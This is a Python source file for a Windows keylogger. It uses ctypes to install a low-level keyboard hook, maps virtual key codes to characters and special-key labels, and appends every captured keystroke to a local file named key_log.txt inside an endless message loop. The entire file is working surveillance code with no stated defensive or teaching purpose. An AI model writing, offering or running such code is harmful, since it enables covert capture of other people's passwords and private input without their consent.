import ctypes
import datetime
import os


# Define necessary structures
class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", ctypes.c_uint),
        ("scanCode", ctypes.c_uint),
        ("flags", ctypes.c_uint),
        ("time", ctypes.c_uint),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))
    ]

# Define callback function for keyboard events
def low_level_keyboard_proc(nCode, wParam, lParam):
    if nCode == 0:  # HC_ACTION
        kb_data = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        vk_code = kb_data.vkCode

        # Open the log file and append the keystroke
        with open(log_file, "a") as f:
            key = None
            if vk_code in KEY_MAP:
                key = KEY_MAP[vk_code]
            elif 0x30 <= vk_code <= 0x5A:  # Alphanumeric keys
                key = chr(vk_code)
            if key:
                f.write(key)
    return user32.CallNextHookEx(None, nCode, wParam, lParam)

# Set up the hook and log file
def set_hook():
    global log_file
    log_file = "key_log.txt"
    hook_proc = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(KBDLLHOOKSTRUCT))
    keyboard_hook = hook_proc(low_level_keyboard_proc)
    hook_id = user32.SetWindowsHookExA(WH_KEYBOARD_LL, keyboard_hook, kernel32.GetModuleHandleW(None), 0)
    if not hook_id:
        print("Failed to install hook")
        os._exit(1)
    return hook_id

# Define key mappings for special keys
KEY_MAP = {
    0x08: "[BACKSPACE]",
    0x09: "[TAB]",
    0x0D: "[ENTER]",
    0x10: "[SHIFT]",
    0x11: "[CTRL]",
    0x12: "[ALT]",
    0x1B: "[ESC]",
    0x20: " ",
    0x2E: "[DEL]"
}

# Constants
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_KEYUP = 0x0101

# Load necessary libraries
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

# Set the hook and start the message loop
hook_id = set_hook()
msg = ctypes.wintypes.MSG()
while True:
    user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
    user32.TranslateMessage(msg)
    user32.DispatchMessageW(msg)
